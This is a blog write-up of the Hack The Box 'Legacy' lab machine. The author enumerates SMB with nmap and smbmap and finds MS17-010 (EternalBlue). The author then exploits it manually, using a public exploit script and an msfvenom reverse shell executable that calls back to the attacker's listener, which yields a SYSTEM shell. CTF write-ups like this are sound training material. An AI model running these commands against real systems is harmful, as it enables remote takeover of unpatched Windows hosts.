---
layout: post
title: "HTB: LEGACY (10.10.10.4)"
description: "Legacy is an easy box on Hack The Box (HTB) that is susceptible to an SMB vulnerability. While it can be quickly exploited using a Metasploit module, I've chosen to demonstrate the manual approach to exploit this vulnerability."
tags: [Windows xp, htb,hackthebox, smb, ms17-010, eternalblue, shadow brokers, msfvenom, Legacy, htb-legacy]
image: "/assets/img/legacy/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

```c
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ sudo nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.4
[sudo] password for george:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 20:37 EAT
Warning: 10.10.10.4 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.4
Host is up (0.64s latency).
Not shown: 52645 closed tcp ports (reset), 12887 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 155.45 seconds

┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ sudo nmap -sC -sV -p135,139,445 -oA nmap/legacy 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-24 20:41 EAT
Nmap scan report for 10.10.10.4
Host is up (0.33s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h28m19s, deviation: 2h07m14s, median: 4d22h58m20s
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-09-29T22:39:46+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9b773 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.82 seconds


┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ sudo nmap -sU -p137 -sC -sV -oA nmap/udp_legacy 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-25 17:40 EAT
Nmap scan report for 10.10.10.4
Host is up (0.30s latency).

PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Microsoft Windows netbios-ns (workgroup: HTB)
| nbns-interfaces:
|   hostname: LEGACY
|   interfaces:
|_    10.10.10.4
Service Info: Host: LEGACY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9d588 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.29 seconds

```
From the result we see 3 TCP (135, 139 and 445) ports open and one UDP port (137)

## SMB
### Testing For NULL Authentication

Trying to authenticate as `NULL` or `anonymous` user fails. I used both `smbmap`, `smbclient` and `crackmapexec`.

```c
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ smbmap -H 10.10.10.4
[+] IP: 10.10.10.4:445  Name: 10.10.10.4                                        
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ smbmap -H 10.10.10.4 -u "" -p ""
[+] IP: 10.10.10.4:445  Name: 10.10.10.4                                        
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ smbmap -H 10.10.10.4 -u "anonymous" -p "anonymous"
[!] Authentication error on 10.10.10.4
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ crackmapexec smb 10.10.10.4
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ crackmapexec smb 10.10.10.4 -u "" -p ""
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.10.10.4      445    LEGACY           [+] legacy\:
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ crackmapexec smb 10.10.10.4 -u anonymous -p anonymous
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.10.10.4      445    LEGACY           [-] legacy\anonymous:anonymous STATUS_LOGON_FAILURE
┌─[george@parrot]─[~/HTB/boxes/legacy]

```

At this point I decided to look at SMB Vulnerabilities. `nmap` has several scripts that can perfom this check

```c
┌─[✗]─[george@parrot]─[~/HTB/boxes/legacy]                                                     
└──╼ $ sudo find / -type f -name smb-vuln* | grep nse$                                                                                                                                        
[sudo] password for george:                                                                                                                                                                   
find: ‘/run/user/1000/doc’: Permission denied                                                                                                                                                 
/usr/share/nmap/scripts/smb-vuln-conficker.nse                                                 
/usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse                                             
/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse                                              
/usr/share/nmap/scripts/smb-vuln-ms06-025.nse                                                  
/usr/share/nmap/scripts/smb-vuln-ms07-029.nse                                                  
/usr/share/nmap/scripts/smb-vuln-ms08-067.nse                                                                                                                                                 
/usr/share/nmap/scripts/smb-vuln-ms10-054.nse                                                  
/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse                                                  
/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse                                                
/usr/share/nmap/scripts/smb-vuln-webexec.nse         
```
And sure enough we get a hit. The box is vulnerable to `ms17-010` aka `eternal blue`.

```c
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ nmap --script smb-vuln* -p 445 -oA nmap/smb_vul 10.10.10.4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-25 12:03 EAT
Nmap scan report for 10.10.10.4
Host is up (0.29s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds
```
### CVE-2017-0143
#### History

Made famous by the [shadow brokers](https://darknetdiaries.com/episode/53/).

Also known as "EternalBlue", is associated majorly with Microsoft Windows Operating System. It is specifically related to a vulnerability in the Server Message Block (SMB) protocol. SMB is a network file sharing protocol that allows applications to read and write to files and request services from server programs.

EternalBlue has been famously used to spread WannaCry and Petya ransomware.

#### Exploit

I searched around for an exploit that doesnt use metasploit and cam across a lot given how famous this exploit is. After numerous tests, I found this [repo](git clone https://github.com/c1ph3rm4st3r/MS17-010_CVE-2017-0143.git) to suite my requirements as I am working with Windows XP.

I will use the **Send_and_execute.py** script to upload an executable and run it.

```c
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ git clone https://github.com/helviojunior/MS17-010.git
Cloning into 'MS17-010'...
remote: Enumerating objects: 202, done.
remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
Receiving objects: 100% (202/202), 118.50 KiB | 670.00 KiB/s, done.
Resolving deltas: 100% (115/115), done.
┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ cd MS17-010/
┌─[george@parrot]─[~/HTB/boxes/legacy/MS17-010]
└──╼ $ ls
BUG.txt                  eternalblue_exploit8.py  eternalchampion_poc2.py  eternalromance_poc2.py  eternalsynergy_poc.py  mysmb.pyc       send_and_execute.py
checker.py               eternalblue_poc.py       eternalchampion_poc.py   eternalromance_poc.py   infoleak_uninit.py     npp_control.py  shellcode
eternalblue_exploit7.py  eternalchampion_leak.py  eternalromance_leak.py   eternalsynergy_leak.py  mysmb.py               README.md       zzz_exploit.py
```

I will generate an `exe` payload to send to the box using `msfvenom`

```c
┌─[george@parrot]─[~/HTB/boxes/legacy]                                                                                                                                                        
└──╼ $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.7 LPORT=9001 EXITFUNC=thread -f exe -a x86 --platform windows -o george.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: george.exe
```
### Shell as NT AUTHORITY\SYSTEM

#### Troubleshooting Python2 Impacket

I will Start my listener and execute the Exploit.

While trying to execute the script, I ran into a couple of problems since it requires python2 and some impacket modules. I had to run it in a `virtualenv`

```c
┌─[✗]─[george@parrot]─[~/HTB/boxes/legacy]                                                                                                                                                    
└──╼ $ python MS17-010/send_and_execute.py 10.10.10.4 george.exe                                                                                                                              
Traceback (most recent call last):                                                                                                                                                            
  File "MS17-010/send_and_execute.py", line 2, in <module>                                                                                                                                    
    from impacket import smb, smbconnection                                                                                                                                                   
ImportError: No module named impacket  

─[george@parrot]─[~/HTB/boxes/legacy]                                                                                                                                                        
└──╼ $ pip2 install impacket                                                                                                                                                                  
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in Janua
ry 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this function
ality.                                                                                                                                                                                        
----snip----                                                                                                                      
Collecting dsinternals                                                                                                                                                                        
  Using cached dsinternals-1.2.4.tar.gz (174 kB)                                                                                                                                              
ERROR: Package 'dsinternals' requires a different Python: 2.7.18 not in '>=3.4'  

┌─[✗]─[george@parrot]─[~/HTB/boxes/legacy]                                                                                                                                                    
└──╼ $ pip2 install virtualenv

┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ virtualenv -p python2 venv               
created virtual environment CPython2.7.18.final.0-64 in 2775ms
  creator CPython2Posix(dest=/home/george/HTB/boxes/legacy/venv, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, wheel=bundle, setuptools=bundle, via=copy, app_data_dir=/home/george/.local/share/virtualenv)
    added seed packages: pip==20.3.4, setuptools==44.1.1, wheel==0.37.1
  activators NushellActivator,PythonActivator,FishActivator,CShellActivator,PowerShellActivator,BashActivator

  ─[george@parrot]─[~/HTB/boxes/legacy]                                                                                                                                                        
  └──╼ $ source venv/bin/activate      

  (venv) ┌─[✗]─[george@parrot]─[~/HTB/boxes/legacy]
  └──╼ $ pip2 install impacket==0.9.22
```

Finally I got it working and the exploit is a success.

```c
(venv) ┌─[george@parrot]─[~/HTB/boxes/legacy]
└──╼ $ python2.7 MS17-010/send_and_execute.py 10.10.10.4 george.exe
Trying to connect to 10.10.10.4:445                                                   
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8616ada8
SESSION: 0xe110bba8
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe2270030
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe22700d0
overwriting token UserAndGroups
Sending file U4A4GV.exe...
Opening SVCManager on 10.10.10.4.....
Creating service SZTf.....
Starting service SZTf.....
The NETBIOS connection with the remote host timed out.
Removing service SZTf.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
```
And We get a shell on the box

```c
┌─[george@parrot]─[~/HTB/boxes/legacy]                                                                                                                                             
└──╼ $ nc -lvnp 9001                                                                           
listening on [any] 9001 ...                                                                    
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.4] 1036                                       
Microsoft Windows XP [Version 5.1.2600]                                                        
(C) Copyright 1985-2001 Microsoft Corp.                                                        

C:\WINDOWS\system32>
```
And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!

Happy hacking!
